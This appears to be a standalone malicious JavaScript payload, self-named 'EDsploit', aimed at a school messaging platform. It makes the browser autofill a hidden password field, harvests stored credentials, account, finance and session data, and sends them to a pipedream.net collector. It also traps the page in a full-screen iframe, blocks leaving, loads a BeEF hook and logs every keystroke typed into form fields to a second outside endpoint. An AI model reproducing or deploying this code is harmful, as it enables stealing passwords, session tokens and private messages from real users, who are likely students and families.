const ur = new URL(document.currentScript.src);

(async function ex() {

	if (window.top.document.querySelector('form[class=EDsploit]')) return;
	await payload();

	const keys = [
		'accounts', 'badges', 'credentials', 'edhydration_auth',
		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
	];
	
	const form = window.top.document.createElement('form');
	form.hidden = true;
	form.className = "EDsploit"
	form.innerHTML = `<input id="username" name="username" autocomplete="username" value=${JSON.parse(sessionStorage.getItem("accounts")).payload.accounts?.[0].identifiant}><input id="password" name="password" autocomplete="current-password" type="password">`
	window.top.document.body.appendChild(form);
	await new Promise(resolve => setTimeout(resolve, 1000));
  
	const data = {
		t: new Date().toISOString(),
		u: navigator.userAgent,
		mid: new URL(window.top.document.querySelector('a[href*="Messagerie"]')).searchParams.get('idMessage') || "null",
		sign: ur.searchParams.get("signature") || false,
		mode: ur.searchParams.get("mode") || "Suppression",
		ps: window.top.document.querySelector('input[type="password"]').value,
		s: Object.fromEntries(
		keys
			.map(k => [k, sessionStorage.getItem(k) ?? localStorage.getItem(k)])
			.filter(([, v]) => v !== null)
			.map(([k, v]) => {
			try { return [k, JSON.parse(v)]; }
			catch { return [k, v]; }
			})
		)
	};

	try {
		await fetch('https://3169a8cec3d0dff512a354276b174afb.m.pipedream.net/session', {
			method: "POST",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify(data)
		});
	} catch {}
})();

async function payload() {
	if (ur.searchParams.get("iframetrap") === "false" || window.top.document.body.querySelector('iframe[class=EDsploit]')) return;
	window.top.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });

	const i = window.top.document.createElement('iframe');
	i.src = `/${JSON.parse(sessionStorage.getItem("accounts")).payload.accounts?.[0].typeCompte}/${JSON.parse(sessionStorage.getItem("accounts")).payload.accounts?.[0].id}/Messagerie`;
	i.className = 'EDsploit';
	i.style.cssText = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
	window.top.document.body.appendChild(i);
        
	i.onload = async () => {
		try {
			const doc = i.contentDocument || i.contentWindow?.document;
			if (!doc) return;

			const beef = doc.createElement('script');
			beef.src = 'https://beef.local/hook.js'; //scan port 4900
			beef.async = true;
			doc.body.appendChild(beef);
			setInterval(() => {
				if (window.top.location.href !== i.contentWindow.location.href) {
					window.top.history.replaceState({}, '', i.contentWindow.location.href);
				}
				const parent = i.contentWindow.document.querySelector('.view-message.printable-message.ck-content');
				if (!parent) return;
				const styles = parent.querySelectorAll(':scope > style');
				styles.forEach(s => s.remove());
			}, 500);

			await new Promise(resolve => setTimeout(resolve, 8000));

			function attachListeners(doc) {
				doc.querySelectorAll('input, div[contenteditable]').forEach(field => {
					if (field._hooked) return;
					field._hooked = true;

					const eventType = field.tagName === 'INPUT' ? 'input' : 'input';

					field.addEventListener('input', async function() {
					const data = { 
						input: this.name || this.id || this.type || this.className || 'field',
						value: this.value || this.innerText,
						location: i.contentWindow.location.href,
						name: JSON.parse(sessionStorage.getItem("accounts")).payload.accounts?.[0].identifiant
					};
					await fetch('https://8d72fc5d27b20a8d575b1973c65a62c3.m.pipedream.net', {
						method: "POST",
						headers: {
							"Content-Type": "application/json"
						},
						body: JSON.stringify(data)});
					});
				});
			}

			const observer = new MutationObserver(() => attachListeners(doc));
			observer.observe(doc.body, { childList: true, subtree: true });
			attachListeners(doc);
		} catch {}
	}

	return;
};
